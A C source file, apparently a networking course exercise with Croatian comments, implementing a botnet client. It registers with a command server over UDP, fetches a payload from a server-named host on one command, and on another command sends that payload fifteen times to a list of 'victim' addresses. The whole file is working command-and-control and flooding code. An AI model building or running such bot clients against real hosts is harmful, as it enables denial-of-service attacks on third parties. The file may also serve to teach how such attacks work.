#include<sys/socket.h>
#include<unistd.h>
#include<netdb.h>
#include<string.h>
#include<stdio.h>
#include<stdlib.h>
#include<err.h>

#define MAXLEN 761
#define PAYLOAD_LEN 512

struct MSG{
    char IP[INET_ADDRSTRLEN];
    char PORT[22];
};

int main(int argc, char *argv[]){
    //fprintf(stderr, "This is an error message.\n");
    if(argc != 3){
        printf("Usage: ./bot server_ip server_port");
        return 1;
    }
    char *hostname = argv[1];
    char *port = argv[2];

    //klijent socket
    int mysock;
    mysock = socket(PF_INET, SOCK_DGRAM, 0);

    if(mysock == -1){
        errx(1, "%s", "Socket is not created.");
    }

    //host socket
    struct sockaddr *host;
    struct addrinfo hints, *res;

    //send
    socklen_t hostlen;
    char *message = "REG\n";

     //recv
    char buf[MAXLEN];
    int msglen;
    struct MSG msg;
    char command;
    int error;

    memset(&hints, 0, sizeof hints);

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    hints.ai_flags = AI_PASSIVE;

    error = getaddrinfo(hostname, port, &hints, &res);
    if(error){
        errx(1, "%s", gai_strerror(error));
    }
    host = res->ai_addr;
    hostlen = res->ai_addrlen;

    error = sendto(mysock, message, strlen(message), 0, host, hostlen);
    if(error == -1){
        errx(1, "%s", "Error while sending data.");
    }
    
    //recieve payload
    char payload[PAYLOAD_LEN];
    char *payloadToBeSent;

    while(1){
        msglen = recvfrom(mysock, buf, MAXLEN, 0, host, &hostlen);

        if(msglen == -1){
            errx(1, "%s", "Error while recieving data.");
        }
        command = buf[0];
        
        if(command == 48){
            //UDP server socket
            struct sockaddr *hostUDP;
            struct addrinfo hintsUDP, *resUDP;

            //send UDP server
            socklen_t hostlenUDP;
            const char *messageHELLO = "HELLO";

            memset(&hintsUDP, 0, sizeof hintsUDP);

            hintsUDP.ai_family = AF_INET;
            hintsUDP.ai_socktype = SOCK_DGRAM;
            hintsUDP.ai_flags = AI_PASSIVE;

            memcpy(&msg.IP, buf + 1, INET_ADDRSTRLEN);
            memcpy(&msg.PORT, buf + 1 + INET_ADDRSTRLEN, 22);

            error = getaddrinfo(msg.IP, msg.PORT, &hintsUDP, &resUDP);
             if(error){
                errx(1, "%s", gai_strerror(error));
            }
            hostUDP = resUDP->ai_addr;
            hostlenUDP = resUDP->ai_addrlen;

            error = sendto(mysock, messageHELLO, strlen(messageHELLO), 0,(const struct sockaddr *) hostUDP, hostlenUDP);
            if(error == -1){
                errx(1, "%s", "Error while sending data.");
            }
            msglen = recvfrom(mysock, payload, PAYLOAD_LEN, 0, hostUDP, &hostlenUDP);
            if(msglen == -1){
                errx(1, "%s", "Error while recieving data.");
            }
            payloadToBeSent = malloc(msglen + 1);
            strncpy(payloadToBeSent, payload, msglen);
            payloadToBeSent[msglen] = '\0';

            int l = strlen("PAYLOAD:");
            if(strncmp(payloadToBeSent, "PAYLOAD:", l) == 0){
                payloadToBeSent += l;
            }

        }else if(command == 49){
            //15 puta: pricekaj sekundu, prodi po svim parovima (host, port) i posalji payload

            struct sockaddr *zrtva;
            struct addrinfo hintsZrtva, *resZrtva;

            socklen_t zrtvalen;

            for(int times = 0; times < 15; times++){
                memset(&hintsZrtva, 0, sizeof hintsZrtva);

                hintsZrtva.ai_family = AF_INET;
                hintsZrtva.ai_socktype = SOCK_DGRAM;
                hintsZrtva.ai_flags = AI_PASSIVE;

                int brojIteracija = (msglen - 1) / 38;
                int b1, b2;
                for(int i = 1; i <= brojIteracija; i++){
                    if(i == 1){
                        b1 = 1;
                        b2 = b1 + 16;
                    }else{
                        b1 = b2 + 22;
                        b2 = b1 + 16;
                    }

                    memcpy(&msg.IP, buf + b1, INET_ADDRSTRLEN);
                    memcpy(&msg.PORT, buf + b2, 22);

                    error = getaddrinfo(msg.IP, msg.PORT, &hintsZrtva, &resZrtva);
                     if(error){
                        errx(1, "%s", gai_strerror(error));
                    }
                    zrtva = resZrtva->ai_addr;
                        zrtvalen = resZrtva->ai_addrlen;

                    sendto(mysock, payloadToBeSent, strlen(payloadToBeSent), 0,(const struct sockaddr *) zrtva, zrtvalen);
                    if(error == -1){
                        errx(1, "%s", "Error while sending data.");
                    }
                }
                sleep(1);
            }

           
        }

        memset(&msg, 0, sizeof(msg));
        memset(buf, 0, MAXLEN);
        memset(&hostlen, 0, sizeof(hostlen));
    }
    close(mysock);
}
